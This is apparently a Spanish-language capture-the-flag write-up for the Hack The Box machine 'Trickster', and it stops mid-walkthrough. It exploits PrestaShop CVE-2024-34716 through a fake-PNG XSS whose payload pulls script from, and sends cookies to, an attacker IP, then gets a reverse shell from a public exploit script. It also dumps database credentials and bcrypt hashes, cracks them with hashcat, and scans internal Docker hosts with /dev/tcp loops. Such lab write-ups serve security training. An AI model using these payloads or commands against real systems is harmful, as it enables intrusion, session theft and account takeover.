#XSS 
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.34 -oG allPorts`
`nmap -p22,80 -sCV 10.10.11.34 -oN targeted`
```python
22/ssh
80/http
```


`gobuster vhost -u http://trickster.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -r --append-domain`
```js
10.10.11.34     trickster.htb shop.trickster.htb
```

Utiliza un `prestashop` que es como un Wordpress para ecomerce

Encontramos en `robots.txt` el directorio `http://shop.trickster.htb/.git/`

Usaremos la herramienta [[GITHACK]] `https://github.com/lijiejie/GitHack.git`
`python3 githack http://shop.trickster.htb/.git/`

Nos traerá toda la web a nuestra maquina y la podemos ver navegando a sus directorios
Encontramos el siguiente directorio de panel de login de Prestashop `http://shop.trickster.htb/admin634ewutrx1jgitlooaj/index.php`

Encontramos la versión y encontramos que tiene un CVE `CVE-2024-34716`
`https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/`

En el PoC nos explica que podemos crear un falso archivo `.png` en el cual podemos incluir contenido JavaScript que será interpretado, por lo que se acontecería un XXS
Este archivo se puede incluir en la web `http://shop.trickster.htb/contact-us`

Creamos el fichero `test.png` con el contenido `<script src="http://10.10.14.18/malicius.js"></script>`

El servicio web hace la solicitud al recurso que hemos levantado en el server de Python

Podemos probar a listar la cookie de sesión `<script src="http://10.10.14.18/?cookie=" + document.cookie></script>`

Como el HttpOnly esta en True no nos permite obtener la cookie

EN el PoC nos dice que hay que subir un tema malicioso podemos usar el repositorio `https://github.com/aelmokhtar/CVE-2024-34716` que nos lo automatiza

Este script nos automatiza todo el proceso de ejecución devolviéndonos una Reverse Shell directamente

`python3 exploit.py --url "http://shop.trickster.htb" --email test@test.com --local-ip 10.10.14.18 --admin-path admin634ewutrx1jgitlooaj
`
Obtendremos una reverse shell como el usuario
Y hacemos un tratamiento de la TTY para que podamos trabajar mas cómodamente

En nuestro directorio acctual encontramos el directoriuo de `prestashop` buscamos por archivos de configuracion `find . -name \*conf\*` y encontramos la siguiente ruta `app/config`  buscamos por archivos que contengan la plabra password `grep -r -i "password"`y encontramos un archivo llamdo `parameters.php`

Y encontramos el usuario de la base de datos 
```ad-hint 
ps_user::prest@shop_o
```

Nos conectamos a la base de datos con el usuario y password encontrados:
`mysql -ups_user -pprest@shop_o -D prestashop`

Al haber muchas tablas se puede filtrar de la siguiente forma
`select table_name from information_schema.columns where column_name = 'email' and table_schema = database();`

Lo que nos hace es: d3e la base de datos actual de todas las tablas muéstrame todas las columnas que contengan la palabra email

Encontramos que en la tabla de empledos es donde se encuentran todos los datos mas relevantes;
`describe ps_employee;`

Obtenemos los usuarios y las contraseñas:
`select email,passwd from ps_employee;`

```ad-hint
admin@trickster.htb

$2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C

james@trickster.htb

$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
```

Para esos hashes los cuardamos en un archivo y se los pasamos ha [[HASCAT]] el cual nos dira diferentes modos que debmos de probar para decodearlo ` hashcat hashes /usr/share/wordlists/rockyou.txt -O `

Nos indica que son bcrypt y tendremos que usar el siguiente parametro
`hashcat hashes /usr/share/wordlists/rockyou.txt -O -m 3200`

Encontramos la contraseña `alwaysandforever` para el usuario `james`
Y conseguiremos pivotar a este usuario

```ad-hint
james::alwaysandforever
```
## Escalada de privilegios
En la búsqueda de binarios SUID no encontramos nada que podamos escalar `find / -perm -4000 2>/dev/null`

Buscaremos capabilities `getcap -r / 2>/dev/null` y tampoco encontramos ninguna que nos pueda servir

Buscamos los puertos abiertos `ss -nltp` tampoco encontramos nada

Buscamos en los procesos con `ps -faux` tampoco encontramos nada útil

Al hacer `hostname -I` encontramos otra IP diferente, encontrando un docker instalado
Para hacer un reconocimiento de las maquinas docker podemos hacer un codigo para identificar las IP que hay
```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 171.17.0.$i" &>/dev/null && echo "[+] Host 172.17.0.$i - ACTIVE" &
done; wait
```

Nos encuentra activo el host `.2`

Vamos a ver que puertos tiene abiertos la maquina creando el siguiente script
```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/172.17.0.2/$port" &>/dev/null && echo "[+] Puerto $port - OPEN" &
done; wait
```

Nos encuentra el puerto `5000` abierto
Y haciendo un `curl` vemos que se trata de una pagina web `curl 172.17.0.2:5000`

Para desde nuestro equipo poder ver la maquina te haga port fordwarding con ssh `ssh james@10.10.11.34 -L 5000:172.17.0.2:5000`

Ahora desde buestra maquina accedemos a `http://localhost:5000` y nos muestra como un panel de login corriendo con CHANGEDETECTION.IO v0.45.20

Buscamos esto en internet a ver si encontramos información sobre ello vemos que tiene un un `CVE-2024-32651` el cual permite `SSTI` que permite acabarlo en un `RCE`

Primero deberemos de ganar acceso a la interfaz y vemos que se reutiliza la password de james y estaríamos dentro de la web



